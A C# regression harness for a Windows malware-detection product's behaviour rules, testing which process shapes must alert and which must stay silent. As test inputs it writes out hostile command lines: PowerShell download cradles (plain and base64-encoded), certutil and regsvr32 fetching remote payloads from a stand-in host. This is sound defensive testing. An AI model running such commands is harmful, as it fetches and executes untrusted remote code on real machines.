using System.Text.RegularExpressions;
using MeowSecurity.Core.Detect;
using MeowSecurity.Core.Processes;

namespace MeowSecurity.Cli;

/// <summary>
/// A regression harness for the behaviour rules.
///
/// Detection code is the one part of this project that cannot be validated by running it —
/// you would have to detonate real malware to see it work. So it is validated against a
/// table instead: known attack shapes that must fire, and everyday developer noise that must
/// stay silent. The second half matters more. A rule that flags every build script gets the
/// whole product muted, which is a worse failure than missing a sample.
///
/// Run with: <c>meowsec --rule-test</c>
/// </summary>
internal static class RuleTest
{
    /// <summary>What the rules are allowed to do with a case.</summary>
    private enum Expect
    {
        /// <summary>Nothing at all. Ordinary work must not produce a single finding.</summary>
        Silent,
        /// <summary>May be written to the log, but must stay below the alert floor.</summary>
        Quiet,
        /// <summary>Must reach High or above — this is what the product exists for.</summary>
        Alert,
    }

    private sealed record Case(string What, ProcessContext Ctx, Expect Expect, string? ExpectRule = null);

    private const string Sys = @"C:\Windows\System32\";
    private const string Temp = @"C:\Users\dev\AppData\Local\Temp\";

    private static ProcessContext P(
        string name, string? parent = null, string? path = null, string? cmd = null,
        SignatureState sig = SignatureState.SignedValid, bool hidden = false,
        bool implanted = false, int remote = 0,
        bool lsass = false, int injTargets = 0, int foreignThreads = 0, bool foreignRwx = false,
        string? badModule = null, bool debugPriv = false, bool impersonating = false,
        bool elevatedUserPath = false) =>
        new(1234, name, 900, parent, path ?? Sys + name, cmd, sig, hidden, implanted, remote, 1,
            lsass, injTargets, foreignThreads, foreignRwx,
            badModule, debugPriv, impersonating, elevatedUserPath);

    private static readonly Case[] Cases =
    {
        // ---------- must raise an alert ----------

        // The handle is the act. It does not matter what the tool is called or who signed it,
        // which is exactly why this case uses a signed binary with an innocent name.
        new("Reading LSASS memory (credential dumping)",
            P("svchost.exe", "services.exe", lsass: true),
            Expect.Alert, "credentials.lsass-read"),

        new("Thread running from writable, file-less memory",
            P("notepad.exe", "explorer.exe", foreignThreads: 1, foreignRwx: true),
            Expect.Alert, "memory.foreign-thread"),

        new("Thread running from file-less memory",
            P("notepad.exe", "explorer.exe", foreignThreads: 2),
            Expect.Alert, "memory.foreign-thread"),

        new("Injection handles held on several processes at once",
            P("updater.exe", "explorer.exe", path: Temp + "updater.exe",
              sig: SignatureState.Unsigned, injTargets: 4),
            Expect.Alert, "inject.handles"),

        // The host is signed, in Program Files, launched by explorer — every rule that judges
        // a process by its own image says it is fine, and every one of them is right. The lie
        // is one directory down.
        new("Signed program side-loading an unsigned DLL from AppData",
            P("trusted.exe", "explorer.exe", path: @"C:\Program Files\Vendor\trusted.exe",
              badModule: @"C:\Users\dev\AppData\Roaming\Vendor\version.dll"),
            Expect.Alert, "hijack.sideloaded-module"),

        new("Unsigned binary in Temp holding the debug privilege",
            P("svc.exe", "cmd.exe", path: Temp + "svc.exe",
              sig: SignatureState.Unsigned, debugPriv: true),
            Expect.Alert, "privilege.debug-enabled"),

        new("Unsigned binary running elevated from a writable folder",
            P("setup.exe", "explorer.exe", path: @"C:\ProgramData\setup.exe",
              sig: SignatureState.Unsigned, elevatedUserPath: true),
            Expect.Alert, "privilege.elevated-unsigned"),
        new("Word spawning PowerShell (macro)",
            P("powershell.exe", "winword.exe", cmd: Sys + "powershell.exe -w hidden"),
            Expect.Alert, "lolbin.office-parent"),

        // Base64 of: IEX (New-Object Net.WebClient).DownloadString('http://x.io/a.ps1')
        new("Encoded command hiding a download cradle",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AeAAuAGkAbwAvAGEALgBwAHMAMQAnACkA"),
            Expect.Alert, "lolbin.encoded-payload"),

        new("Encoded command that will not decode",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell.exe -enc AAAAAAAAAAAAAAAAAAAAA"),
            Expect.Alert, "lolbin.command-line"),

        new("Download cradle (IEX + WebClient)",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.io/a.ps1')\""),
            Expect.Alert, "lolbin.command-line"),

        new("certutil as a downloader",
            P("certutil.exe", "cmd.exe", cmd: "certutil -urlcache -split -f http://x.io/a.exe a.exe"),
            Expect.Alert, "lolbin.command-line"),

        new("squiblydoo (regsvr32 remote scriptlet)",
            P("regsvr32.exe", "cmd.exe", cmd: "regsvr32 /s /u /i:http://x.io/a.sct scrobj.dll"),
            Expect.Alert, "lolbin.command-line"),

        new("svchost.exe from a temp folder",
            P("svchost.exe", "explorer.exe", path: Temp + "svchost.exe", sig: SignatureState.Unsigned),
            Expect.Alert, "masquerade.system-name"),

        new("Double extension lure",
            P("invoice.pdf.exe", "explorer.exe", path: Temp + "invoice.pdf.exe",
              sig: SignatureState.Unsigned),
            Expect.Alert, "masquerade.double-extension"),

        new("rundll32 with no arguments",
            P("rundll32.exe", "explorer.exe", cmd: Sys + "rundll32.exe"),
            Expect.Alert, "lolbin.bare-rundll32"),

        new("Hidden from one enumeration source",
            P("anything.exe", "explorer.exe", hidden: true),
            Expect.Alert, "stealth.hidden"),

        new("Injected PE in memory",
            P("notepad.exe", "explorer.exe", implanted: true),
            Expect.Alert, "memory.implanted-pe"),

        new("Broken signature",
            P("updater.exe", "explorer.exe", path: @"C:\Tools\updater.exe",
              sig: SignatureState.SignedInvalid),
            Expect.Alert, "sign.invalid"),

        new("Unsigned binary in temp calling out",
            P("x.exe", "explorer.exe", path: Temp + "x.exe", sig: SignatureState.Unsigned, remote: 3),
            Expect.Alert, "network.unsigned-remote"),

        new("wscript running from temp",
            P("wscript.exe", "explorer.exe", path: Temp + "wscript.exe", sig: SignatureState.Unsigned),
            Expect.Alert, "script.user-path"),

        // ---------- worth logging, never worth a pop-up ----------
        // Base64 of: Get-ChildItem "C:\src" | Select-Object Name
        // Honest tooling encodes its commands to escape quoting rules; only the decoded
        // text can separate that from an attack, so the engine decodes before it judges.
        new("Encoded command whose payload is ordinary",
            P("powershell.exe", "node.exe",
              cmd: "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACIAQwA6AFwAcwByAGMAIgAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAATgBhAG0AZQA="),
            Expect.Quiet, "lolbin.command-line"),

        new("Invoke-WebRequest downloading an installer to disk",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell -Command \"Invoke-WebRequest -Uri https://x.io/setup.msi -OutFile setup.msi\""),
            Expect.Quiet, "lolbin.command-line"),

        // ---------- must stay completely silent (everyday developer noise) ----------
        new("A build script's PowerShell",
            P("powershell.exe", "cmd.exe",
              cmd: "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"& ./build.ps1\""),
            Expect.Silent),

        new("An agent shell wrapper using Invoke-Expression locally",
            P("powershell.exe", "cmd.exe",
              cmd: "powershell.exe -NoProfile -Command \"$s = $env:SCRIPT; Invoke-Expression -Command $s\""),
            Expect.Silent),

        new("curl fetching an API in a terminal",
            P("curl.exe", "cmd.exe", cmd: "curl -s https://api.github.com/repos/x/y"),
            Expect.Silent),

        new("git.exe from Program Files",
            P("git.exe", "cmd.exe", path: @"C:\Program Files\Git\bin\git.exe"),
            Expect.Silent),

        new("Ordinary svchost",
            P("svchost.exe", "services.exe", cmd: Sys + "svchost.exe -k netsvcs -p"),
            Expect.Silent),

        new("node running an inline script",
            P("node.exe", "cmd.exe", path: @"C:\Program Files\nodejs\node.exe",
              cmd: "node -e \"console.log(1)\""),
            Expect.Silent),

        new("Explorer itself",
            P("explorer.exe", "userinit.exe", path: @"C:\Windows\explorer.exe"),
            Expect.Silent),

        new("An unsigned tool the user built, in their own projects folder",
            P("mytool.exe", "cmd.exe", path: @"D:\src\mytool\bin\mytool.exe",
              sig: SignatureState.Unsigned),
            Expect.Silent),

        new("msiexec installing a normal package",
            P("msiexec.exe", "explorer.exe", cmd: "msiexec /i setup.msi /qn"),
            Expect.Silent),

        // A debugger attached to the process it is debugging is a developer's whole working day.
        new("A debugger attached to one process",
            P("devenv.exe", "explorer.exe", path: @"C:\Program Files\VS\devenv.exe", injTargets: 1),
            Expect.Silent),

        // Measured on a real, clean desktop: conhost holds full access to every process
        // attached to its console, none of them its children. An earlier version of the
        // injection rule fired on it, which would have meant an alert on an idle machine.
        new("conhost holding full access to its console's processes",
            P("conhost.exe", "svchost.exe", injTargets: 4),
            Expect.Silent),

        // A debugger holds the debug privilege because that is what a debugger is. The rule
        // asks for the combination — the privilege *and* a home anything could have written to.
        new("A debugger in Program Files holding the debug privilege",
            P("windbg.exe", "explorer.exe", path: @"C:\Program Files\Debugging Tools\windbg.exe",
              debugPriv: true),
            Expect.Silent),

        // Caught by running the product, not by writing a test: Microsoft Defender lives in
        // ProgramData — which is on the writable-folder list, correctly — and holds the debug
        // privilege, because opening any process is what an antivirus does. Alarming about the
        // antivirus is the worst false positive there is: it is the alert a user is most likely
        // to act on, and acting on it leaves them less safe.
        new("Microsoft Defender holding the debug privilege from ProgramData",
            P("MsMpEng.exe", "services.exe",
              path: @"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
              debugPriv: true, impersonating: true),
            Expect.Silent),

        // An installer the user just approved is elevated and unsigned, which is ordinary the
        // moment it lives somewhere an installer normally lives.
        new("A signed installer running elevated from Program Files",
            P("setup.exe", "explorer.exe", path: @"C:\Program Files\App\setup.exe",
              elevatedUserPath: false),
            Expect.Silent),

        // Services impersonate their callers all day. On its own it says nothing.
        new("A system service impersonating a caller",
            P("svchost.exe", "services.exe", impersonating: true),
            Expect.Silent),
    };

    /// <summary>
    /// Checks that every string the interface asks for actually exists.
    ///
    /// A missing key is returned as itself, deliberately, so that a mistake is visible rather
    /// than silent. That works — but only if somebody looks. Five keys reached a built product
    /// this way, and the startup page showed the literal text "status.scanning" to every user
    /// in both languages until a screenshot caught it. This is the check that would have.
    ///
    /// It reads the source rather than the running interface, because the alternative is
    /// clicking through every page in two languages and hoping.
    /// </summary>
    private static (int Checked, List<string> Missing) CheckStrings()
    {
        var root = FindRepositoryRoot();
        if (root is null) return (0, []);

        var used = new HashSet<string>();
        var defined = new HashSet<string>();

        foreach (var file in Directory.EnumerateFiles(root, "*.cs", SearchOption.AllDirectories))
        {
            if (file.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}") ||
                file.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}")) continue;

            string text = File.ReadAllText(file);
            foreach (Match m in Regex.Matches(text, @"Strings\.T\(""([^""]+)"""))
                used.Add(m.Groups[1].Value);
            foreach (Match m in Regex.Matches(text, @"\[""([a-z][a-zA-Z0-9_.\-]+)""\]\s*=\s*\("))
                defined.Add(m.Groups[1].Value);
        }

        foreach (var file in Directory.EnumerateFiles(root, "*.xaml", SearchOption.AllDirectories))
        {
            if (file.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}")) continue;
            foreach (Match m in Regex.Matches(File.ReadAllText(file), @"\{loc:T\s+([^\}\s]+)\s*\}"))
                used.Add(m.Groups[1].Value);
        }

        return (used.Count, used.Where(k => !defined.Contains(k)).OrderBy(k => k).ToList());
    }

    /// <summary>Walks up from the running binary until the solution file appears.</summary>
    private static string? FindRepositoryRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (dir.EnumerateFiles("*.sln").Any() ||
                dir.EnumerateDirectories("MeowSecurity.Core").Any())
                return dir.FullName;
            dir = dir.Parent;
        }
        return null;
    }

    /// <summary>
    /// Drives the health monitor with a synthetic clock. The measuring is trivial; the part
    /// worth pinning down is the restraint — strain must hold a full minute before it is
    /// mentioned, it must be mentioned only once, and a later episode must be able to speak
    /// again after the machine recovers.
    /// </summary>
    private static bool RunHealth()
    {
        var monitor = new MeowSecurity.Core.Health.HealthMonitor();
        var t = new DateTime(2026, 1, 1, 12, 0, 0);
        var fired = new List<string>();

        MeowSecurity.Core.Live.SystemPulse Pulse(double cpu, double memPercent) =>
            new(cpu, (long)(memPercent * 1_000_000), 100_000_000, 0, 0, 200, 2000);

        void Tick(double cpu, double mem, int seconds)
        {
            for (int i = 0; i < seconds; i++)
            {
                if (monitor.Observe(Pulse(cpu, mem), "miner.exe", t) is { } ev) fired.Add(ev.Rule);
                t = t.AddSeconds(1);
            }
        }

        Tick(95, 40, 30);   // strained, but not yet for long enough
        bool quietEarly = fired.Count == 0;

        Tick(95, 40, 45);   // now past a minute
        bool firedOnce = fired.Count == 1 && fired[0] == "health.cpu";

        Tick(95, 40, 120);  // still strained — must not repeat
        bool stillOnce = fired.Count == 1;

        Tick(20, 40, 60);   // recovered
        Tick(95, 40, 90);   // a second episode may speak again
        bool secondEpisode = fired.Count == 2;

        Tick(20, 95, 90);   // memory now, cpu calm
        bool memoryFired = fired.Count == 3 && fired[2] == "health.memory";

        var checks = new (string What, bool Ok)[]
        {
            ("silent before a minute of strain", quietEarly),
            ("reports once the minute has passed", firedOnce),
            ("does not repeat while strain continues", stillOnce),
            ("reports again after recovery", secondEpisode),
            ("memory pressure reported separately", memoryFired),
        };

        Console.WriteLine("\nHealth monitor\n" + new string('-', 78));
        foreach (var (what, ok) in checks)
            Console.WriteLine($"  {(ok ? "PASS" : "FAIL")}  {what}");
        return checks.All(c => c.Ok);
    }

    public static bool Run()
    {
        int pass = 0, fail = 0;
        Console.WriteLine($"Behaviour rules — {Cases.Length} cases\n" + new string('-', 78));

        foreach (var c in Cases)
        {
            var result = BehaviorEngine.Evaluate(c.Ctx);

            bool ok = c.Expect switch
            {
                Expect.Silent => result.IsEmpty,
                Expect.Quiet => !result.IsEmpty && result.Severity < Severity.High,
                Expect.Alert => result.Severity >= Severity.High,
                _ => false,
            };
            if (ok && c.ExpectRule is not null)
                ok = result.Detections.Any(d => d.Rule == c.ExpectRule);

            if (ok) pass++; else fail++;

            string rules = result.IsEmpty
                ? "(silent)"
                : string.Join(", ", result.Detections.Select(d => d.Rule));
            Console.WriteLine($"  {(ok ? "PASS" : "FAIL")}  {c.What,-52} {c.Expect,-6} " +
                              $"score {result.Score,3}  {rules}");
            if (!ok && c.ExpectRule is not null)
                Console.WriteLine($"        expected rule: {c.ExpectRule}");
        }

        Console.WriteLine(new string('-', 78));
        Console.WriteLine($"  {pass} passed, {fail} failed");

        bool health = RunHealth();

        var (checkedKeys, missing) = CheckStrings();
        Console.WriteLine("\nInterface strings\n" + new string('-', 78));
        if (checkedKeys == 0)
            Console.WriteLine("  SKIP  source tree not found from here");
        else if (missing.Count == 0)
            Console.WriteLine($"  PASS  all {checkedKeys} keys the interface asks for are defined");
        else
            foreach (var key in missing)
                Console.WriteLine($"  FAIL  \"{key}\" is asked for but never defined — users see the key itself");

        return fail == 0 && health && missing.Count == 0;
    }
}
